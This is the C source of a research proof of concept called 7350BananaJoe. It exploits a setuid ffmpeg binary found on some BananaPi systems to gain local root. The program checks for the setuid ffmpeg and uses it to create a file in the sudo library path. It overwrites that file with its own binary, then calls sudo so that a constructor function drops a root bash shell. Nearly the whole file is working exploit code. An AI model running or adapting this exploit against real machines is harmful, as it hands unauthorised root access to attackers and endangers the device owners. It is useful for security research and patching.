/*
 * This file is part of the 7350BananaJoe research PoC
 *
 * (C) 2021 by c-skills, Sebastian Krahmer,
 *             sebastian [dot] krahmer [at] gmail [dot] com
 *
 * 7350BananaJoe is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * 7350BananaJoe is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with 7350BananaJoe.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>


extern char **environ;


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


char *dso = "/usr/lib/sudo/libpthread.so.0";


__attribute__((constructor)) void boomsh()
{

	if (geteuid())
		return;

	unlink(dso);

	char *sh[] = {"/bin/bash", "--norc", "--noprofile", NULL};

	setuid(0);
	execve(*sh, sh, environ);
}


int main()
{

	printf("\n[*] 7350BananaJoe boomsh for BananaPi with ffmpeg suid bugdoor installed.\n\n");
	printf("[*] (C) 2021 c-skills Sebastian Krahmer -- https://github.com/stealth/bananajoe\n");
	printf("[*] DISCLAIMER: For educational purposes only! Use at your own risk!!!\n\n[*] Initial setup ...\n\n");

	if (geteuid() == 0)
		boomsh();

	char *ffmpeg[] = {"/usr/local/bin/ffmpeg-3.1.4", "-i", "/usr/share/scratch/Media/Sounds/Human/Laugh-male3.mp3", "-f", "wav", "-y", dso, NULL};
	pid_t pid = 0;

	struct stat st;
	memset(&st, 0, sizeof(st));
	stat(*ffmpeg, &st);

	printf("[*] Checking for ffmpeg being suid ...\n");
	if ((st.st_mode & 04000) != 04000)
		die("[-] Bugdoor not installed");
	printf("[+] Bugdoor found.\n");

	umask(0);

	if ((pid = fork()) == 0) {
		close(1); close(2);
		open("/dev/zero", O_RDWR);
		dup2(1,2);
		execve(*ffmpeg, ffmpeg, NULL);
		exit(1);
	}

	int status = 0;
	waitpid(pid, &status, 0);

	printf("[+] ffmpeg exited\n");

	if (stat(dso, &st) != 0)
		die("[-] Creating file did not work.\n");

	printf("[+] Success!\n[*] Dumping DSO ...\n");

	int ofd = open(dso, O_RDWR|O_TRUNC);
	int ifd = open("/proc/self/exe", O_RDONLY);
	if (ifd < 0 || ofd < 0)
		die("[-] open");

	char buf[0x1000] = {0};
	ssize_t r = 0;
	while ((r = read(ifd, buf, sizeof(buf))) > 0)
		write(ofd, buf, r);

	close(ifd);
	close(ofd);

	printf("[+] Success!\n");

	system("sudo");

	return 0;
}

